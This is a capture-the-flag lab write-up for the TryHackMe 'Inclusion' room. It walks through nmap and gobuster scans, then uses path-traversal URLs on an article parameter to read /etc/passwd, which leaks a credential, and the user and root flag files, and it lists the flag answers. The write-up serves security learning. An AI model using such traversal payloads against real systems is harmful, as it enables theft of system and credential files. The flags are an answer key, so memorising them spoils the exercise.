Swatish Attaluri
Date: 09-06-2021
## Inclusion - Tryhackme
### Machine IP: 10.10.47.73
#### Nmap scan
```bash
$ nmap -sC -sC -oN ports 10.10.47.73   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-09 19:02 IST
Nmap scan report for 10.10.47.73
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http
|_http-title: My blog

Nmap done: 1 IP address (1 host up) scanned in 27.66 seconds
```
#### Gobuster
```bash
$ gobuster dir -u 10.10.47.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.47.73
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/09 19:04:38 Starting gobuster in directory enumeration mode
===============================================================
/article              (Status: 500) [Size: 290]
Progress: 32818 / 220561 (14.88%)
```
Browsing through the web page we can browse an article by clicking in view details.
On clicking the hacking article, the url is : http://MACHINE-IP/article?name=hacking
Lets see if directory traversal works.
Lets us give some random number(5) of "../" and open /etc/passwd
http://MACHINE-IP/article?name=../../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```
We can see the the contents of the passwd file.
Also, we can see that a username: "falconfeast"
Now, we can browse through the users directory and get the contents of user.txt(Usually the flag is in user.txt)
http://MACHINE-IP/article?name=../../../../../home/falconfeast/user.txt
60989655118397345799
Likewise, lets see if we can get the contents of root.txt from the root directory.
http://MACHINE-IP/article?name=../../../../../root/root.txt
42964104845495153909
#### Answers
```
user flag
60989655118397345799
root flag    
42964104845495153909
```

#LFI